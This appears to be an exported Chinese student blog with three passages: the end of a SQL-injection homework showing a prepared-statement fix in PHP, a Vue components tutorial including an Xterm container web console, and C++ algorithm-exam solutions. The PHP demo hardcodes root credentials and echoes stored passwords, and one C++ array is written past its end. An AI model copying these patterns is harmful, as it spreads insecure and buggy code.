<span class="hljs-variable">$mysqli</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);  <span class="hljs-comment">// 数据库服务器的主机名这里使用的本地主机，密码，使用的数据库名</span>
<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_connect_errno</span>())&#123;
    <span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;fail:%s&lt;br&gt;&quot;</span>,<span class="hljs-title function_ invoke__">mysqli_connect_error</span>());
    <span class="hljs-keyword">exit</span>();
&#125;

<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;TABLE border=1,width=400&gt;&quot;</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;&quot;</span>;
<span class="hljs-variable">$result</span> =  <span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&quot;select * from users where username=? and password=?&quot;</span>);

<span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">bind_param</span>(<span class="hljs-string">&#x27;ss&#x27;</span>,<span class="hljs-variable">$uname</span>,<span class="hljs-variable">$pwd</span>);
<span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();
<span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">store_result</span>();
<span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">bind_result</span>(<span class="hljs-variable">$id</span>,<span class="hljs-variable">$un</span>,<span class="hljs-variable">$pd</span>); <span class="hljs-comment">//将查询到的变量绑定到三个自定义的变量中，输出时直接输出这三个变量即可。</span>
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>())
&#123;
	<span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;&quot;</span>,<span class="hljs-variable">$un</span>,<span class="hljs-variable">$pd</span>);
&#125;
<span class="hljs-keyword">else</span>
&#123;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;username or password error.&quot;</span>;
&#125;



<span class="hljs-comment">// if(strlen($pwd)&gt;=16||strlen($uname)&gt;=15)</span>
<span class="hljs-comment">// &#123;</span>
<span class="hljs-comment">// 	echo &quot;It is too long.&quot;;</span>
<span class="hljs-comment">// &#125;</span>
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/TABLE&gt;&quot;</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/div&gt;&quot;</span>;
<span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();
<span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();
<span class="hljs-meta">?&gt;</span></code></pre>

<p>应用预编译语句后，再次输入注入语句后就不再起到注入作用，只是将其当成正常的查询过程，返回相应的结果。</p>
]]></content>
      <categories>
        <category>网安作业</category>
      </categories>
      <tags>
        <tag>sql</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>vue_component</title>
    <url>/2022/05/26/vue-component/</url>
    <content><![CDATA[<h1 id="Vue组件"><a href="#Vue组件" class="headerlink" title="Vue组件"></a>Vue组件</h1><p>做项目中使用到的vue组件，记录一下，以后使用到时直接复制即可</p>
<h2 id="Element-UI"><a href="#Element-UI" class="headerlink" title="Element UI"></a>Element UI</h2><h3 id="进入项目目录，安装依赖"><a href="#进入项目目录，安装依赖" class="headerlink" title="进入项目目录，安装依赖"></a>进入项目目录，安装依赖</h3><pre><code class="hljs sh">npm install element-ui -S</code></pre>

<p>安装成功后，查看配置文件<code>package.json</code>，是否有element-ui组件的版本号 如下图：</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220526152216904.png" alt="image-20220526152216904"></p>
<h3 id="在main-js文件中-引入-element-组件"><a href="#在main-js文件中-引入-element-组件" class="headerlink" title="在main.js文件中 引入 element 组件"></a>在main.js文件中 引入 element 组件</h3><pre><code class="hljs gradle"><span class="hljs-keyword">import</span> ElementUI <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;element-ui&#x27;</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;element-ui/lib/theme-chalk/index.css&#x27;</span>;
Vue.use(ElementUI, &#123; <span class="hljs-keyword">size</span>: <span class="hljs-string">&quot;mini&quot;</span> &#125;);</code></pre>

<p>完成以上两个步骤，即可在项目中使用element-ui提供的组件了</p>
<h2 id="Echarts"><a href="#Echarts" class="headerlink" title="Echarts"></a>Echarts</h2><h3 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h3><pre><code class="hljs cmake">npm <span class="hljs-keyword">install</span> echarts -S</code></pre>

<p>如果不加版本号则默认安装最新版</p>
<pre><code class="hljs apache"><span class="hljs-attribute">npm</span> install echarts@<span class="hljs-number">5</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span> -S</code></pre>

<p>添加版本号，可以安装指定版本的依赖包，如图所示。</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220526152216904.png" alt="image-20220526152216904"></p>
<p>在vue文件中使用Echarts</p>
<h3 id="创建dom组件"><a href="#创建dom组件" class="headerlink" title="创建dom组件"></a>创建dom组件</h3><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pie&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 500px; height: 400px&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></code></pre>

<h3 id="初始化图表数据"><a href="#初始化图表数据" class="headerlink" title="初始化图表数据"></a>初始化图表数据</h3><pre><code class="hljs js"><span class="hljs-keyword">var</span> pieOption = &#123;
  <span class="hljs-attr">title</span>: &#123;
    <span class="hljs-attr">text</span>: <span class="hljs-string">&#x27;各季度会员数量统计&#x27;</span>,
    <span class="hljs-attr">subtext</span>: <span class="hljs-string">&#x27;比例图&#x27;</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-string">&#x27;center&#x27;</span>
  &#125;,
  <span class="hljs-attr">tooltip</span>: &#123;
    <span class="hljs-attr">trigger</span>: <span class="hljs-string">&#x27;item&#x27;</span>
  &#125;,
  <span class="hljs-attr">legend</span>: &#123;
    <span class="hljs-attr">orient</span>: <span class="hljs-string">&#x27;vertical&#x27;</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-string">&#x27;left&#x27;</span>
  &#125;,
  <span class="hljs-attr">series</span>: [
    &#123;
      <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;pie&#x27;</span>,
      <span class="hljs-attr">radius</span>: <span class="hljs-string">&#x27;60%&#x27;</span>,
      <span class="hljs-attr">label</span>:&#123;            <span class="hljs-comment">//饼图图形上的文本标签</span>
        <span class="hljs-attr">normal</span>:&#123;
          <span class="hljs-attr">show</span>:<span class="hljs-literal">true</span>,
          <span class="hljs-attr">position</span>:<span class="hljs-string">&#x27;inner&#x27;</span>, <span class="hljs-comment">//标签的位置</span>
          textStyle : &#123;
            fontWeight : <span class="hljs-number">300</span> ,
            fontSize : <span class="hljs-number">14</span>,    <span class="hljs-comment">//文字的字体大小</span>
            <span class="hljs-attr">color</span>: <span class="hljs-string">&quot;#fff&quot;</span>
          &#125;,
          <span class="hljs-attr">formatter</span>:<span class="hljs-string">&#x27;&#123;d&#125;%&#x27;</span>
        &#125;
      &#125;,
      <span class="hljs-attr">data</span>: [],  <span class="hljs-comment">// 填空</span>
      <span class="hljs-attr">emphasis</span>: &#123;
        <span class="hljs-attr">itemStyle</span>: &#123;
          <span class="hljs-attr">shadowBlur</span>: <span class="hljs-number">10</span>,
          <span class="hljs-attr">shadowOffsetX</span>: <span class="hljs-number">0</span>,
          <span class="hljs-attr">shadowColor</span>: <span class="hljs-string">&#x27;rgba(0, 0, 0, 0.5)&#x27;</span>
        &#125;
      &#125;
    &#125;
  ]
&#125;;

<span class="hljs-keyword">var</span> pieDom = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;pie&#x27;</span>);
<span class="hljs-keyword">var</span> pieChart = echarts.<span class="hljs-title function_">init</span>(pieDom);</code></pre>

<p>其中<code>  data: [],</code>是表格显示的数据，这里是需要重点实现的</p>
<p>这里可以在前端页面中写死数据，但是大多需要请求后端接口获取数据，如下</p>
<pre><code class="hljs js"><span class="hljs-variable language_">this</span>.<span class="hljs-property">request</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/echarts/members&quot;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span>&#123;
      pieOption.<span class="hljs-property">series</span>[<span class="hljs-number">0</span>].<span class="hljs-property">data</span> = [
        &#123;<span class="hljs-attr">name</span>: <span class="hljs-string">&quot;第一季度&quot;</span>, <span class="hljs-attr">value</span>: res.<span class="hljs-property">data</span>[<span class="hljs-number">0</span>]&#125;,
        &#123;<span class="hljs-attr">name</span>: <span class="hljs-string">&quot;第二季度&quot;</span>, <span class="hljs-attr">value</span>: res.<span class="hljs-property">data</span>[<span class="hljs-number">1</span>]&#125;,
        &#123;<span class="hljs-attr">name</span>: <span class="hljs-string">&quot;第三季度&quot;</span>, <span class="hljs-attr">value</span>: res.<span class="hljs-property">data</span>[<span class="hljs-number">2</span>]&#125;,
        &#123;<span class="hljs-attr">name</span>: <span class="hljs-string">&quot;第四季度&quot;</span>, <span class="hljs-attr">value</span>: res.<span class="hljs-property">data</span>[<span class="hljs-number">3</span>]&#125;,
      ]
    pieChart.<span class="hljs-title function_">setOption</span>(pieOption);
&#125;</code></pre>

<p>实现效果图</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220526155808268.png" alt="image-20220526155808268"></p>
<h2 id="Xterm"><a href="#Xterm" class="headerlink" title="Xterm"></a>Xterm</h2><p>毕业设计中实现了在网页中进入容器内容，也就是<code>docker exec -it containerId bash</code>功能</p>
<p>与webSHH功能类似</p>
<h3 id="安装依赖-1"><a href="#安装依赖-1" class="headerlink" title="安装依赖"></a>安装依赖</h3><pre><code class="hljs cmake">npm <span class="hljs-keyword">install</span> xterm -S</code></pre>

<p>安装使用到的插件</p>
<pre><code class="hljs sh">npm install xterm-addon-attach -S
npm install xterm-addon-fit -S</code></pre>

<p>本文使用的版本如下</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220526160612795.png" alt="image-20220526160612795"></p>
<h3 id="在页面中导入使用到的包"><a href="#在页面中导入使用到的包" class="headerlink" title="在页面中导入使用到的包"></a>在页面中导入使用到的包</h3><pre><code class="hljs js"><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;xterm/css/xterm.css&quot;</span>;
<span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Terminal</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;xterm&quot;</span>;
<span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">FitAddon</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;xterm-addon-fit&quot;</span>;
<span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">AttachAddon</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;xterm-addon-attach&quot;</span>;</code></pre>

<p>前端所有代码如下</p>
<pre><code class="hljs vue">&lt;template&gt;
  &lt;div class=&quot;app-container&quot;&gt;
    &lt;el-row &gt;
      &lt;h1&gt;Web Console&lt;/h1&gt;
        &lt;div id=&quot;log&quot; style=&quot;margin-top:20px;&quot;&gt;
          &lt;div class=&quot;xterm&quot; id=&quot;terminal&quot;&gt;&lt;/div&gt;
        &lt;/div&gt;
    &lt;/el-row&gt;
  &lt;/div&gt;
&lt;/template&gt;
&lt;script&gt;
import &quot;xterm/css/xterm.css&quot;;
import &#123; Terminal &#125; from &quot;xterm&quot;;
import &#123; FitAddon &#125; from &quot;xterm-addon-fit&quot;;
import &#123; AttachAddon &#125; from &quot;xterm-addon-attach&quot;;

export default &#123;
  components: &#123;&#125;,
  props: &#123;
    socketURI: &#123;
      type: String,
      default: &quot;&quot;
    &#125;
  &#125;,
  data() &#123;
    return &#123;
      term: null,
      socket: null,
      rows: 40,
      // cols: 10,
      webSocketUrl: &#x27;&#x27;, //&quot;ws://127.0.0.1:8081/terminal?workdir=/&amp;container=5e0647ee611b&quot;,
      SetOut: false,
      isKey: false
    &#125;
  &#125;,
  computed: &#123;&#125;,
  watch: &#123;&#125;,
  created() &#123;
    const id = this.$route.query.id
    console.log(id)
    this.webSocketUrl = &quot;ws://127.0.0.1:8081/terminal?workdir=/&amp;container=&quot; + id
  &#125;,
  mounted() &#123;
    this.initSocket();
  &#125;,
  beforeDestroy() &#123;
    this.socket.close();
    // this.term.dispose();
  &#125;,
  methods: &#123;
    submitForm() &#123;
      this.$refs[&#x27;elForm&#x27;].validate(valid =&gt; &#123;
        if (!valid) return
        // TODO 提交表单
      &#125;)
    &#125;,
    resetForm() &#123;
      this.$refs[&#x27;elForm&#x27;].resetFields()
    &#125;,
    //Xterm主题
    initTerm(data, callback) &#123;
      const term = new Terminal(&#123;
        rendererType: &quot;canvas&quot;, //渲染类型
        rows: this.rows, //行数
        // cols: this.cols,// 设置之后会输入多行之后覆盖现象
        convertEol: true, //启用时，光标将设置为下一行的开头
        // scrollback: 10,//终端中的回滚量
        fontSize: 14, //字体大小
        disableStdin: false, //是否应禁用输入。
        cursorStyle: &quot;block&quot;, //光标样式
        cursorBlink: true, //光标闪烁
        scrollback: 30,
        tabStopWidth: 8,
        theme: &#123;
          foreground: &quot;green&quot;, //字体
          background: &quot;#000000&quot;, //背景色
          cursor: &quot;help&quot; //设置光标
        &#125;
      &#125;);
      const attachAddon = new AttachAddon(this.socket);
      const fitAddon = new FitAddon();
      term.loadAddon(attachAddon);
      term.loadAddon(fitAddon);
      term.open(document.getElementById(&quot;terminal&quot;));
      fitAddon.fit();
      term.focus();
      let _this = this;
      //限制和后端交互，只有输入回车键才显示结果
      term.prompt = () =&gt; &#123;
        term.write(&quot;\r\n$ &quot;);
      &#125;;
      term.prompt();

      function runFakeTerminal(_this) &#123;
        if (term._initialized) &#123;
          return;
        &#125;
        // 初始化
        term._initialized = true;
        term.writeln();//控制台初始化报错处
        term.prompt();
        // / **
        //     *添加事件监听器，用于按下键时的事件。事件值包含
        //     *将在data事件以及DOM事件中发送的字符串
        //     *触发了它。
        //     * @返回一个IDisposable停止监听。
        //  * /
        //   / ** 更新：xterm 4.x（新增）
        //  *为数据事件触发时添加事件侦听器。发生这种情况
        //  *用户输入或粘贴到终端时的示例。事件值
        //  *是`string`结果的结果，在典型的设置中，应该通过
        //  *到支持pty。
        //  * @返回一个IDisposable停止监听。
        //  * /
        // 支持输入与粘贴方法
        term.onData(function(key) &#123;
          let order = &#123;
            Data: key,
            Op: &quot;stdin&quot;
          &#125;;
          _this.onSend(order);
        &#125;);
        _this.term = term;
      &#125;

      runFakeTerminal(_this);
    &#125;,
    //webShell主题
    initSocket() &#123;
      const WebSocketUrl = this.webSocketUrl
      this.socket = new WebSocket(
        WebSocketUrl
      );
      this.socketOnClose(); //关闭
      this.socketOnOpen(); //
      this.socketOnError();
    &#125;,
    //webshell链接成功之后操作
    socketOnOpen() &#123;
      this.socket.onopen = () =&gt; &#123;
        // 链接成功后
        this.initTerm();
      &#125;;
    &#125;,
    //webshell关闭之后操作
    socketOnClose() &#123;
      this.socket.onclose = () =&gt; &#123;
        console.log(&quot;close socket&quot;);
      &#125;;
    &#125;,
    //webshell错误信息
    socketOnError() &#123;
      this.socket.onerror = () =&gt; &#123;
        console.log(&quot;socket 链接失败&quot;);
      &#125;;
    &#125;,
    //特殊处理
    onSend(data) &#123;
      data = this.base.isObject(data) ? JSON.stringify(data) : data;
      data = this.base.isArray(data) ? data.toString() : data;
      data = data.replace(/\\\\/, &quot;\\&quot;);
      this.shellWs.onSend(data);
    &#125;,
    //删除左右两端的空格
    trim(str) &#123;
      return str.replace(/(^\s*)|(\s*$)/g, &quot;&quot;);
    &#125;
  &#125;
&#125;
&lt;/script&gt;
&lt;style&gt;
&lt;/style&gt;</code></pre>

<p>以前前端代码基本不需要改动，只需要修改后端的api</p>
<pre><code class="hljs ini"><span class="hljs-attr">this.webSocketUrl</span> = <span class="hljs-string">&quot;ws://127.0.0.1:8081/terminal?workdir=/&amp;container=&quot;</span> + id</code></pre>

<p>将该参数修改为后端websocket接口即可使用</p>
<h2 id="vue-video-player"><a href="#vue-video-player" class="headerlink" title="vue-video-player"></a>vue-video-player</h2><h3 id="安装依赖-2"><a href="#安装依赖-2" class="headerlink" title="安装依赖"></a>安装依赖</h3><pre><code class="hljs sh">npm install vue-video-player@5.0.2 -S</code></pre>

<h3 id="在单文件中使用"><a href="#在单文件中使用" class="headerlink" title="在单文件中使用"></a>在单文件中使用</h3><p>首先导入依赖</p>
<pre><code class="hljs js"><span class="hljs-keyword">import</span> &#123; videoPlayer &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue-video-player/src&#x27;</span>  
<span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;video.js/dist/video-js.css&#x27;</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;vue-video-player/src/custom-theme.css&#x27;</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;
  <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;VideoDetail&quot;</span>,
  <span class="hljs-attr">components</span>: &#123;
    videoPlayer
  &#125;,</code></pre>

<p>之前是<code>import &#123; videoPlayer &#125; from &#39;vue-video-player&#39;</code> ，报错信息如下</p>
<pre><code class="hljs subunit"> error  in ./node_modules/vue-video-player/dist/vue-video-player.js

Module not found: Error: Can&#x27;t resolve &#x27;videojs&#x27; in &#x27;E:\Sunzh\java\admin_demo\hello-world\node_modules\vue-video-player\dist&#x27;

<span class="hljs-keyword">ERROR </span>in ./node_modules/vue-video-player/dist/vue-video-player.js
Module not found: Error: Can&#x27;t resolve &#x27;videojs&#x27; in &#x27;E:\Sunzh\java\admin_demo\hello-world\node_modules\vue-video-player\dist&#x27;
 @ ./node_modules/babel-loader/lib/index.js??clonedRuleSet<span class="hljs-string">-40</span>[0].rules[0].use[0]!./node_modules/@vue/vue-loader-v15/lib/index.js??vue-loader-options!./src/views/Detail.vue?vue&amp;type=scr
ipt&amp;lang=js&amp; 13:0<span class="hljs-string">-47</span> 19:17<span class="hljs-string">-28</span>
 @ ./src/views/Detail.vue?vue&amp;type=script&amp;lang=js&amp; 1:0<span class="hljs-string">-212</span> 1:228<span class="hljs-string">-231</span> 1:233<span class="hljs-string">-442</span> 1:233<span class="hljs-string">-442</span>
 @ ./src/views/Detail.vue 2:0<span class="hljs-string">-58</span> 3:0<span class="hljs-string">-53</span> 3:0<span class="hljs-string">-53</span> 9:2<span class="hljs-string">-8</span>
 @ ./src/router/index.js 82:11<span class="hljs-string">-40</span>
 @ ./src/main.js 7:0<span class="hljs-string">-30</span> 26:10<span class="hljs-string">-16</span>
</code></pre>



<p>完整的前端代码</p>
<pre><code class="hljs vue">&lt;template&gt;
  &lt;div&gt;
    &lt;div class=&#x27;demo&#x27;&gt;
      &lt;video-player class=&quot;video-player-box&quot;
                    ref=&quot;videoPlayer&quot;
                    :playsinline=&quot;true&quot;
                    :options=&quot;playerOptions&quot;&gt;
      &lt;/video-player&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
import &#123; videoPlayer &#125; from &#x27;vue-video-player/src&#x27;
import &#x27;video.js/dist/video-js.css&#x27;
import &#x27;vue-video-player/src/custom-theme.css&#x27;

export default &#123;
  name: &quot;VideoDetail&quot;,
  components: &#123;
    videoPlayer
  &#125;,
  data() &#123;
    return &#123;
      // id: this.$route.query.id,
      // video: &#123;&#125;,
      playerOptions: &#123;
        playbackRates: [0.5, 1.0, 1.5, 2.0], // 可选的播放速度
        autoplay: true, // 如果为true,浏览器准备好时开始回放。
        muted: false, // 默认情况下将会消除任何音频。
        loop: false, // 是否视频一结束就重新开始。
        preload: &#x27;auto&#x27;, // 建议浏览器在&lt;video&gt;加载元素后是否应该开始下载视频数据。auto浏览器选择最佳行为,立即开始加载视频（如果浏览器支持）
        language: &#x27;zh-CN&#x27;,
        aspectRatio: &#x27;16:9&#x27;, // 将播放器置于流畅模式，并在计算播放器的动态大小时使用该值。值应该代表一个比例 - 用冒号分隔的两个数字（例如&quot;16:9&quot;或&quot;4:3&quot;）
        fluid: true, // 当true时，Video.js player将拥有流体大小。换句话说，它将按比例缩放以适应其容器。
        sources: [&#123;
          type: &quot;video/mp4&quot;, // 类型
          src: &#x27;&#x27; // url地址
        &#125;],
        poster: &#x27;&#x27;, // 封面地址
        notSupportedMessage: &#x27;此视频暂无法播放，请稍后再试&#x27;, // 允许覆盖Video.js无法播放媒体源时显示的默认信息。
        controlBar: &#123;
          timeDivider: true, // 当前时间和持续时间的分隔符
          durationDisplay: true, // 显示持续时间
          remainingTimeDisplay: true, // 是否显示剩余时间功能
          fullscreenToggle: true // 是否显示全屏按钮
        &#125;
      &#125;
    &#125;
  &#125;,
  created() &#123;
    let id =  this.$route.query.id
    // this.playerOptions.sources[0].src = &quot;http://vjs.zencdn.net/v/oceans.mp4&quot;
    this.request(&quot;/file/detail/&quot; + id).then(res =&gt; &#123;
      console.log(res.data)
      this.video = res.data
      this.playerOptions.sources[0].src = res.data.url

    &#125;)
  &#125;,
  methods: &#123;&#125;
&#125;
&lt;/script&gt;

&lt;style&gt;

&lt;/style&gt;
</code></pre>

<p>需要修改的位置只有<code>this.playerOptions.sources[0].src </code></p>
<p>将参数换成你的视频地址即可</p>
<p>实现效果如下</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220526161723965.png" alt="image-20220526161723965"></p>
<p>可以调整播放速度</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220526161842064.png" alt="image-20220526161842064"></p>
<h2 id="Markdown"><a href="#Markdown" class="headerlink" title="Markdown"></a>Markdown</h2>]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>算法上机复习</title>
    <url>/2020/11/04/%E7%AE%97%E6%B3%95%E4%B8%8A%E6%9C%BA%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<p>最近算法实验要上机考试，所以还是准备一下吧(还不是因为自己太菜了)</p>
<span id="more"></span>

<h1 id="16级题目"><a href="#16级题目" class="headerlink" title="16级题目"></a>16级题目</h1><h2 id="问题-A-星空梦想——鲁班"><a href="#问题-A-星空梦想——鲁班" class="headerlink" title="问题 A: 星空梦想——鲁班"></a>问题 A: 星空梦想——鲁班</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>鲁班七号是王者峡谷里的射手，站撸英雄。战场上的鲁班七号，机制强大的鲨嘴炮，立刻将挡在前路的任何物体轰飞。正如他所说的，“借你们的肉体试验下新发明的威力”。是的，这就是鲁班大师和他的天才机关造物鲁班七号。然而，鲁班最为致命的缺点是腿短，跑得慢，一个稍不留神，便会被刺客所击杀。</p>
<p>既然腿短，那么就来多多运动吧，跳跳台阶可还行？假设鲁班七号一次可以跳上1级台阶，但极限一次只能跳上2级台阶（腿短没办法，嘤嘤嘤）。鲁班七号现在从0级阶梯开始，最终跳上第n级的台阶，求总共有多少种跳法？</p>
<h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p>多组测试用例。</p>
<p>第一行输入包含一个整数T（1&lt;&#x3D;T&lt;&#x3D;50），代表测试用例个数。</p>
<p>接下来T行，每行输入包含一个整数n（1&lt;&#x3D;n&lt;&#x3D;50），代表鲁班最终跳上了第n级台阶。</p>
<h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>每组测试用例对应一行输出，每行输出一个整数ans，代表鲁班最终跳上第n级台阶的跳法种数。</p>
<h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><pre><code class="hljs">3
3
4
50</code></pre>

<h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><pre><code class="hljs dns"><span class="hljs-number">3</span>
<span class="hljs-number">5</span>
<span class="hljs-number">20365011074</span></code></pre>

<h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><p>注意结果超过int范围，请用long long类型存储ans</p>
<pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;
<span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">50</span>;
<span class="hljs-type">long</span> <span class="hljs-type">long</span> f[N];
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	f[<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>,f[<span class="hljs-number">1</span>]=<span class="hljs-number">1</span>;
	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;=<span class="hljs-number">50</span>;i++)
	&#123;
		f[i]=f[i<span class="hljs-number">-1</span>]+f[i<span class="hljs-number">-2</span>];
	&#125;
	<span class="hljs-type">int</span> n;
	cin&gt;&gt;n;
	<span class="hljs-keyword">while</span>(n--)
	&#123;
		<span class="hljs-type">int</span> m;
		cin&gt;&gt;m;
		cout&lt;&lt;f[m]&lt;&lt;endl;
	&#125;
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
 &#125; 
</code></pre>



<h2 id="问题-B-午夜歌剧——元歌"><a href="#问题-B-午夜歌剧——元歌" class="headerlink" title="问题 B: 午夜歌剧——元歌"></a>问题 B: 午夜歌剧——元歌</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>元歌是王者峡谷里的刺客。何谓至高机关之美呢？唯有以至高权力的手令太古奇迹重现人世，方能称得上啊。</p>
<p>是的，元歌擅长操控，所做傀儡能起到以假乱真的作用，今天元歌的傀儡变成你的初中数学老师，给你出个数学题：给你一个数字x，让你求出k7、k6、k5、k4、k3、k2、k1、k0（0&lt;&#x3D;ki&lt;&#x3D;9），使得以下等式1成立，最后根据等式2求出最终ans值。</p>
<p>等式1：</p>
<p><img src="https://s1.ax1x.com/2018/11/07/iTxDvF.png" alt="img"></p>
<p>等式2：</p>
<p><img src="https://s1.ax1x.com/2018/11/07/iTxsu4.png" alt="img"></p>
<h3 id="输入-1"><a href="#输入-1" class="headerlink" title="输入"></a>输入</h3><p>多组测试用例。</p>
<p>第一行输入包含一个整数T（1&lt;&#x3D;T&lt;&#x3D;1000），代表测试用例个数。</p>
<p>接下来T行，每一行包含一个整数x（1&lt;&#x3D;x&lt;&#x3D;1500000）。</p>
<h3 id="输出-1"><a href="#输出-1" class="headerlink" title="输出"></a>输出</h3><p>每组测试用例对应一行输出，每行输出一个整数ans，代表最终运算结果。</p>
<h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入"></a>样例输入</h3><pre><code class="hljs dns"><span class="hljs-number">3</span>
<span class="hljs-number">7</span>
<span class="hljs-number">143</span>
<span class="hljs-number">3223193224</span></code></pre>

<h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出"></a>样例输出</h3><pre><code class="hljs dns"><span class="hljs-number">10</span>
<span class="hljs-number">151</span>
<span class="hljs-number">163311433223</span></code></pre>

<h3 id="提示-1"><a href="#提示-1" class="headerlink" title="提示"></a>提示</h3><p>测试数据均大于等于1，不用特判0</p>
<p>感觉图片等式有点问题，一开始没理解什么意思，后来看了学长的提示。本质就是进制转换。</p>
<pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;
<span class="hljs-type">int</span> t,m;
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">convert</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-type">int</span> c,r;
	r=n%<span class="hljs-number">7</span>;
	c=n/<span class="hljs-number">7</span>;
	<span class="hljs-keyword">if</span>(c&gt;<span class="hljs-number">0</span>)
	&#123;
		<span class="hljs-built_in">convert</span>(c);
		cout&lt;&lt;r;
	&#125;
	<span class="hljs-keyword">else</span>
	cout&lt;&lt;n;
&#125; 
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	cin&gt;&gt;t;
	<span class="hljs-keyword">while</span>(t--)
	&#123;
		cin&gt;&gt;m;
		<span class="hljs-built_in">convert</span>(m);
		cout&lt;&lt;endl;
	&#125;
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
 &#125;</code></pre>

